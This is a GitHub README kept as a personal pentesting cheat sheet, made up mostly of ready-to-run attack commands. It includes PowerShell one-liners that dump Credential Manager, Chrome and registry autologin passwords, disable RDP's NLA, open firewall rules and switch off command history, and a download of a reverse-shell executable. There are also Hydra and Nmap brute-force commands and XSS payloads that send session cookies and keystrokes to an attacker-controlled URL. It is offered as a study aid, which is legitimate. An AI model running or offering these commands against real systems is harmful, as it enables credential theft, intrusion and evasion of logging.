 <!-- <h1 align='center'> Penetration time</h1> -->
 <body>
	
[![Typing SVG](https://readme-typing-svg.demolab.com?font=Bitter&weight=500&size=40&pause=1000&color=3C4CFF&background=AC51FF00&width=500&height=80&lines=P3netrati0n+T1me!)](https://git.io/typing-svg)
<img src='https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExYWM2NWI0ZDIwMjA3ZWIyYWRiZmEyYzA5NTFlNThmNTFhYWI1MWE0ZiZlcD12MV9pbnRlcm5hbF9naWZzX2dpZklkJmN0PWc/3oz8xA9gtnyVDPZJHW/giphy.gif' width='250'/>
<h1> My pentesting cheat sheet library, where I share "hotkey" tools, websites and the same things in one place during my learning path and increasing Cyber Security skills. </h1>
<h3 id='start'> There are: </h3>
<ol>
	<li> <a href='https://github.com/Kode-n-Rolla/pentesting_time/tree/main/network_tools'> Network tools </a>
  	<li> <a href='#n1'> Command examples </a>
  	<li> <a href='#n2'> Payloads </a>
  	<li> <a href='#n3'> Helpful sites </a>
	<li> <a href='#n4'> Tools </a>
	<li> <a href='https://github.com/Kode-n-Rolla/pentesting_time/tree/main/shells'> Web Shells </a>
	<li> <a href='#n5'> Browser add-ons </a>
	<li> <a href='#n6'> Some info about Privilege Escalation </a>
	<li> <a href ='https://github.com/Kode-n-Rolla/pentesting_time/blob/main/Action_Plan_Map.md'> Help </a> about pentest process
	<!--<li> cheat sheet injections
	<li> resume my stars 
	Add XSStrike to Tools!-->
 	<p> <h3> <ins>N.B. <-- Back link - Means return to the table of contents.</ins> </h3>

</ol>

<h2 align='center' id='n1'><em> Command Examples</em> </h2> 
	Topic contains:
	<li> Remote Desktop Protocol <a href='#n1.1'> (RDP) </a>
	<li> <a href='#n1.2'> PowerShell </a> commands
	<li> <a href='#n1.3'> Find </a> commands in Linux
	<li> <a href='#n1.4'> Nmap </a> commands with vulners script
	<li> <a href='#n1.5'>Gobuster </a> dirs enumeration command
	<li> <a href='#n1.6'> Hydra </a> commands
	<li> <a href='#n1.7'> Dirsearch </a> command example
	<li> <a href='#n1.8'> Pump </a> shell, if target system has python3
<h3 id='n1.1'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Remote Desktop Protocol (RDP): </h3>
  <pre><code> xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:&lt;TARGET_IP> /u:&lt;USERNAME> /p:&lt;'PASSWORD'> </code></pre>
  <p><pre><code> xfreerdp /v:&lt;TARGET_IP> /u:&lt;USERNAME> /p:&lt;PASSWORD> +clipboard </code></pre>
	
<h3 id='n1.2'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PowerShell commands </h3>
<ul>
   <li> To get stable shell from unstable from PowerShell. FILENAME.exe is the reverse shell:
  <pre><code> powershell -c "Invoke-WebRequest -Uri 'http://&lt;LOCAL_IP>:&lt;PORT>/&lt;FILENAME.exe>' -OutFile 'C:\Windows\Temp\&lt;FILENAME.exe>'" </code></pre>

  <li><p> With this command, you can identify files with potentially sensitive data such as account information, credentials, configuration files, etc. based on their filename: <pre><code>gci c:\ -Include *pass*.txt,*pass*.xml,*pass*.ini,*pass*.xlsx,*cred*,*vnc*,*.config*,*accounts* -File -Recurse -EA SilentlyContinue</code></pre>

  <li><p> This command will look for remnants of autosets and autoconfigurations that could potentially contain plain text or base64 encoded passwords: <pre><code>gci c:\ -Include *sysprep.inf,*sysprep.xml,*sysprep.txt,*unattended.xml,*unattend.xml,*unattend.txt -File -Recurse -EA SilentlyContinue</code></pre>

  <li><p> With this command it is possible to find files containing a specific pattern, for example here we are looking for the "password" pattern in various text configuration files: <pre><code>gci c:\ -Include *.txt,*.xml,*.config,*.conf,*.cfg,*.ini -File -Recurse -EA SilentlyContinue | Select-String -Pattern "password"</code></pre>

  <li><p> Using the following PowerShell command, you can find database connection strings (with plain text credentials) stored in various configuration files such as web.config for ASP.NET configuration, Visual Studio project files, etc.: <pre><code>gci c:\ -Include *.config,*.conf,*.xml -File -Recurse -EA SilentlyContinue | Select-String -Pattern "connectionString"</code></pre>

  <li><p> With this command, you can easily find configuration files belonging to a Microsoft IIS, XAMPP, Apache, PHP, or MySQL installation: <pre><code>gci c:\ -Include web.config,applicationHost.config,php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -EA SilentlyContinue</code></pre>

  <li><p> With the following one-liner, we can retrieve all stored credentials from the credential manager using the CredentialManager PowerShell module: <pre><code>Get-StoredCredential | % { write-host -NoNewLine $_.username; write-host -NoNewLine ":" ; $p = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($p); }</code></pre>

  <li><p> The following command retrieves saved credentials from the Google Chrome browser, if installed and if there are saved passwords: <pre><code>[System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($datarow.password_value,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser))</code></pre>

  <li><p> The following command will get the autologin credentials from the registry: <pre><code>gp 'HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon' | select "Default*"</code></pre>

  <li><p> Sometimes it can be useful to set the MAC address on a network interface, and with PowerShell we can easily do this without using third party utilities: <pre><code>Set-NetAdapter -Name "Ethernet0" -MacAddress "00-01-18-57-1B-0D"</code></pre>

  <li><p> This trio of commands can be useful when there is a goal to connect to the system using a graphical RDP session, but for some reason it is not enabled: 
  <p> Allow RDP connections - <pre><code>(Get-WmiObject -Class "Win32_TerminalServiceSetting" -Namespace root\cimv2\terminalservices).SetAllowTsConnections(1)</code></pre> 
  <p> Disable NLA - <pre><code>(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)</code></pre> 
  <p> Allow RDP on the firewall - <pre><code>Get-NetFirewallRule -DisplayGroup "Remote Desktop" | Set-NetFirewallRule -Enabled True</code></pre>

  <li><p> Here is a useful command to whitelist an IP address in Windows Firewall: <pre><code>New-NetFirewallRule -Action Allow -DisplayName "name_rule" -RemoteAddress &lt;DESIRED_IP></code></pre>
  After we are done with our cases, remove the rule: <pre><code>Remove-NetFirewallRule -DisplayName "name_rule"</code></pre>

  <li><p> With the following commands, we can disable the logging feature of PowerShell commands in the current shell session: <pre><code>Set-PSReadlineOption –HistorySaveStyle SaveNothing</code></pre> 
  <p> OR <pre><code>Remove-Module PSReadline</code></pre>

  <li><p> Here is a simple PowerShell command to query the Security Center and determine all installed antivirus products on this computer: <pre><code>Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct</code></pre>

</ul>
  
<h3 id='n1.3'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Commands to find in: </h3>
<h4> &nbsp;&nbsp;&nbsp; Linux </h4>
	Find all files in / directory (-type d for find dirs):
	<p> <pre><code> find / -type f </code></pre>
	File name search:
	<p> <pre><code> find / -type f | grep '&lt;FILE_NAME>' </code></pre>
	Find all path files with ‘config’ in proc dirs:
	<p> <pre><code> find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null </code></pre>
 <!-- Add Windows commands --!>
		
<h3 id='n1.4'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Nmap with vulnerse script </h3>
Need to <a href='https://github.com/vulnersCom/nmap-vulners/archive/master.zip'> download </a> script files from github and install it. Thanks for that, <a href='https://github.com/vulnerscom'> Vulners Team </a>!

   Checking for a vulnerability in the software on the server:
   <p> <pre><code> Nmap -Pn &lt;TARGET_IP> --script=vulnerse.nse -p &lt;PORT(S)> </code></pre>
   Checking brute force resistance on ssh:
   <p> <pre><code> nmap --script ssh-brute -p &lt;SSH_PORT> &lt;TARGET_IP> --script-args userdb=users.lst,passdb=passwords.lst </code></pre>
   Checking brute force resistance on ftp:
   <p> <pre><code> nmap -d --script ftp-brute -p &lt;FTP_PORT> &lt;TARGET_IP> </code></pre>
   Checking mysql anonymous login:
   <p> <pre><code> nmap -sV --script=mysql-empty-password &lt;TARGET_IP> </code></pre>
   Attempts to select a pair of login/password to enter the mysql database:
   <p> <pre><code> nmap --script mysql-brute -p &lt;MYSQL_PORT> &lt;TARGET_IP> --script-args userdb=users.lst, passdb=passwords.lst </code></pre>
   Search for hidden folders and files:
   <p> <pre><code> nmap -sV -p &lt;PORT> –script http-enum &lt;TARGET_IP> </code></pre>
   <p> P.S. If CMS, research <code>&lt;name_0f_CMS_0r_DB> brute force nmap</code>
	   
<h3 id='n1.5'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Gobuster command: </h3>
   <pre><code> gobuster dir &lt;TARGET_URL> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt </code></pre>
		
<h3 id='n1.6'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hydra </h3>
   Brute force against a protocol of some choice:
   <pre><code> hydra -P &lt;WORLIST> -v &lt;TARGET_IP> &lt;PROTOCOL> </code></pre>
   <p> 	Can use Hydra to bruteforce usernames as well as passwords. It will loop through every combination in some lists. (-vV = verbose mode, showing login attempts):
   <pre><code> hydra -v -V -u -L &lt;USERNAME_LIST> -P &lt;PASSWORD_LIST> -t 1 -u &lt;TARGET_IP> &lt;PROTOCOL> </code></pre>
   <p> Attack a Windows Remote Desktop with a password list:
   <pre><code> hydra -t 1 -V -f -l &lt;USERNAME> -P &lt;WORDLIST> rdp://&lt;TARGET_IP> </code></pre>
   <p> Craft a more specific request for Hydra to brute force:
   <pre><code> hydra -l &lt;USERNAME> -P .&lt;PASSWORD_LIST> $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' </code></pre>
		
<h3 id='n1.7'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Dirsearch </h3>
   Search a lot of interesting by extensions:
   <pre><code> dirsearch -e php,log,sql,txt,bak,tar,tar.gz,zip,rar,swp,gz,asp,aspx -u '&lt;TARGER_IP>' </code></pre>
		
<h3 id='n1.8'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Python command to pump nc shell </h3>
   PTY is a library for pseudo-terminal functionality that is part of the Standard Python Library. There is a nc shell and get pump shell:
   <pre><code> python -c 'import pty;pty.spawn("/bin/bash")' </code></pre>

<h3 align='right'><a href='#start'> <-- Back </a></h3>
   
	
<h2 align='center' id='n2'><em> Payloads </em></h2>
    <h3> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XSS Payloads </h3>
    <li> <b> Proof Of Concept (PoC) </b> - <pre><code> <script>alert('Success XSS!');</script> </code></pre>
      <p> This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text "Success XSS".
    <li> <b> Session Stealing </b> - <pre><code> <script>fetch('url/steal?cookie=' + btoa(document.cookie));</script> </code></pre>
      <p> Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.
    <li> <b> Key Logger </b> - <pre><code> <scripr>document.onkeypress = function(v) {fetch('url/log?key=' + btoa(v.key));}</script> </code></pre>
      <p> The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.
    <li> <b> Business Logic </b> - <pre><code> <script>user.changeEmail('e@mail.com');</script> </code></pre>
      <p> This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called user.changeEmail().
    <li> <b> Polyglots </b> - <pre><code> jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('Success XSS!'))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('Success XSS!')//>\x3e </code></pre>
      <p> An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully.

<h3 align='right'><a href='#start'> <-- Back </a></h3>
	      
        
<h2 align='center' id='n3'><em> Sites </em></h2>
      <h3> Cheat sheets </h3>
	      <li> <a href='https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet'> Reverse Shell </a> cheatsheets
	      <li> <a href='https://devhints.io/bash'> Bash scripting </a> cheatsheets
              <li> <a href='https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993'> PowerShell </a> cheatsheets
	      <li> <a href='https://infosecwriteups.com/pimp-my-shell-5-ways-to-upgrade-a-netcat-shell-ecd551a180d2'> How </a> pump nc shell
      <h3> Hashes, encode/decode, cracker, identify </h3>
	      <li> <a href='https://crackstation.net/'> crackstation.net </a> - online password hash cracker
	      <li> <a href='https://www.base64encode.org/'> Base64 </a> encode/decode
	      <li> <a href='https://hashes.com/en/tools/hash_identifier'> Identify hash types </a>
	      <li> <a href='https://gchq.github.io/CyberChef/'> CyberChef </a> - encode/decode service
	      <li> <a href='https://www.kirsle.net/wizards/flask-session.cgi'> Flask Session Cookie Decoder </a>
	      <li> <a href='https://www.cs.drexel.edu/~jpopyack/IntroCS/HW/RSAWorksheet.html'> RSA </a> calculator
      <h3> Learning Path </h3>
	      <li> <a href='https://tryhackme.com/'> TryHackMe </a>
	      <li> <a href='https://www.hackthebox.com/'> HackTheBox </a>
	      <li> <a href='https://hackthissite.org/'> HackThisSite </a>
	      <li> <a href='https://ctftime.org/ctfs'> CTF </a> practice
	      <li> <a href='http://www.itsecgames.com/'> BWAPP </a> - buggy web application. Virtual pentest laboratory to practice.
	      <li> Free <a href='https://thexssrat.podia.com/ratatatata'> set </a> of practice tasks. Thanks to <a href='https://www.youtube.com/c/TheXSSrat'> TheXSSrat </a>
      <h3> OSINT </h3>
	      <li> <a href='https://viewdns.info/'> ViewDNS </a> Offers reverse IP Lookup.
              <li> <a href='https://www.shodan.io/'> Shodan </a> is the world's first search engine for Internet-connected devices.
              <li> <a href='https://search.censys.io/'> Censys Search </a> Can provide a lot of information about IP addresses and domains.	
      <h3> Password Services </h3>
	      <li> <a href='https://cirt.net/passwords'> CIRT.net </a> Default Passwords service
	      <li> <a href='https://default-password.info/'> Default-Password.info </a> Default Passwords service
	      <li> <a href='https://datarecovery.com/rd/default-passwords/'> Datarecovery.com </a> Default Passwords service
	      <li> <a href='https://wiki.skullsecurity.org/index.php?title=Passwords'> This </a> wiki page includes the most well-known collections of passwords.

<h3 align='right'><a href='#start'> <-- Back </a></h3>
       
        
<h2 align='center' id='n4'><em> Tools </em></h2>
	<ol>
		<li><h3><a href='https://www.kali.org/tools/ncurses-hexedit/'> Hexeditor </a></h3>
	        	<p> Tools for change files signature. <a href='https://en.wikipedia.org/wiki/List_of_file_signatures'> Link </a> to Wiki with List of file signatures. 
		<li><h3><a href='https://gitlab.com/kalilinux/packages/hash-identifier/-/tree/kali/master'> Tool </a> for hash identification. </h3> 
			<p> Python file. Powerful. User friendly interface.
		<li><h3><a href='https://www.kali.org/tools/crunch/'> Crunch </a></h3>
		   <p> This is one of many powerful tools for creating an offline wordlist. With crunch, you can specify numerous options, including min, max, and options. The following example creates a wordlist containing all possible combinations of 3 characters, including 1-5 and qwerty. You can use the -o argument to save. <p>Example: <pre><code> crunch 3 3 12345qwerty -o cranch.txt </code></pre>
		<li><h3><a href='https://github.com/therodri2/username_generator'> Username generator </h3>
			<p> Could help create a list with most of the possible combinations if we have a first name and last name. Use git clone and <p> <pre><code> python3 username_generator.py -h </code></pre> shows the tool's help message and optional arguments.
		<li><h3><a href='https://github.com/digininja/CeWL'> Cewl </a></h3>
			Cewl can be used to effectively crawl a website and extract strings or keywords. Cewl is a powerful tool to generate a wordlist specific to a given company or target. Consider the following example below:
			<pre><code> cewl -w list.txt -d 5 -m 5 http://target_site.com </code></pre>
			<p> -w will write the contents to a file, here is list.txt.
			<p> -m 5 gathers strings (words) that are 5 characters or more
			<p> -d 5 is the depth level of web crawling/spidering (default 2)
			<p> http://target_site.com is the URL that will be used
			<p> As a result, now have a decently sized wordlist based on relevant words for the specific enterprise, like names, locations, and a lot of their business lingo. Similarly, the wordlist that was created could be used to fuzz for usernames. 
	</ol>
			
<h3 align='right'><a href='#start'> <-- Back </a></h3>


 <h2 align='center' id='n5'><em> Browser add-ons </em></h2>
 <h3> Mozilla FireFox </h3>
	<ul>
		<li> <a href='https://addons.mozilla.org/en-US/firefox/addon/beautifer-minify/'> Beautifer & Minify </a> - Brings readable CSS, HTML and JavaScript code
		<li> <a href='https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/'> Cookie Editor </a> - Allows you to change, delete, add cookie values for various testing purposes. Can be tested for access control errors, privilege escalation, etc
		<li> <a href='https://addons.mozilla.org/en-US/firefox/addon/dotgit/'> DotGit </a> - An extension to check for the presence of .git on websites you visit. Also checks open .env files, security.txt and more
		<li> <a href='https://addons.mozilla.org/en-US/firefox/addon/mailshunt-email-extractor/'> Email Extractor </a> - Automatically saves email addresses from the web pages we visit. Helps with social engineering attacks, brute force attacks, etc
		<li> <a href='https://addons.mozilla.org/en-US/firefox/addon/fake-filler/'> Fake Filler </a> - Simplifies and speeds up testing of fillable forms by developers and testers. Helps to populate all input forms (text fields, areas, dropdowns, etc.) with fake and randomly generated data
		<li> <a href='https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/'> Foxy Proxy </a> - Fast change proxy, for example, use with Burp Suite
		<li> <a href='https://addons.mozilla.org/en-US/firefox/addon/maxs-hackbar/'> Hackbar </a> - Contains payloads for XSS attacks, SQL injections, WAF bypass, LFI, etc
		<li> <a href='https://addons.mozilla.org/en-US/firefox/addon/knoxss-community-edition/'> Knoxss </a> -
			Finds XSS vulnerabilities. Community Edition and Pro Version
		<li> <a href='https://addons.mozilla.org/en-US/firefox/addon/modheader-firefox/'> ModHeader </a> - Helps to easily change HTTP request and response headers in the browser
		<li> <a href='https://addons.mozilla.org/en-US/firefox/addon/privacy-badger17/'> Privicy Badger  </a> - Automatically learns to block invisible trackers
		<li> <a href='https://addons.mozilla.org/en-US/firefox/addon/retire-js/'> Retire.js </a> - Displays the presence of vulnerable JavaScript libraries. This helps to find known vulnerabilities in JS and some CVEs affecting sites with vulnerable JS libraries
		<li> <a href='https://addons.mozilla.org/en-US/firefox/addon/shodan-addon/'> Shodan </a> - The Shodan plugin tells you where the website is hosted (country, city), who owns the IP and what other services/ ports are open
		<li> <a href='https://addons.mozilla.org/en-US/firefox/addon/ublock-origin/?utm_source=addons.mozilla.org&utm_medium=referral&utm_content=search'> Ublock Origin </a> - An efficient wide-spectrum content blocker
		<li> <a href='https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/'> Wappalyzer </a> - Defines CMS, JS-libraries, frameworks and another technologies used on the site
	</ul>
 <h3> Google Chrome </h3>
	<ul>
		<li> <a href='https://chrome.google.com/webstore/detail/shodan/jjalcfnidlmpjhdfepjhjbhnhkbgleap'> Shodan </a> for Chrome
		<li> <a href='https://chrome.google.com/webstore/detail/trufflehog/bafhdnhjnlcdbjcdcnafhdcphhnfnhjc'> TruffleHog Chrome Extension </a> - Scans the websites you visit looking for API keys and credentials and notifies you if they are found
  	</ul>
   
<h3 align='right'><a href='#start'> <-- Back </a></h3>

<h2 align='center' id='n6'><em> Privilege Escalation </em></h2>
	 <h3> Linux </h3>
  		Some advice to Linux Privilege Escalation
    		<ul>
			<li> Check kernel ( <code>uname -a</code> ) and OS version ( <code>cat /etc/os-release</code> ) and exploit this
			<li> Check screen version ( <code>screen -v</code> ) and exploit this
			<li> Check Cron Tab
			<li> Check setuid and setgid
			<li> Check NOPASSWD sudo command ( <code>sudo -l</code> ) and use this command(s)
			<li> Check PATH ( <code>echo $PATH</code> )
    		</ul>
       <!-- <h3> Windows </h3> -->
      
<h3 align='right'><a href='#start'> <-- Back </a></h3>        

</body>
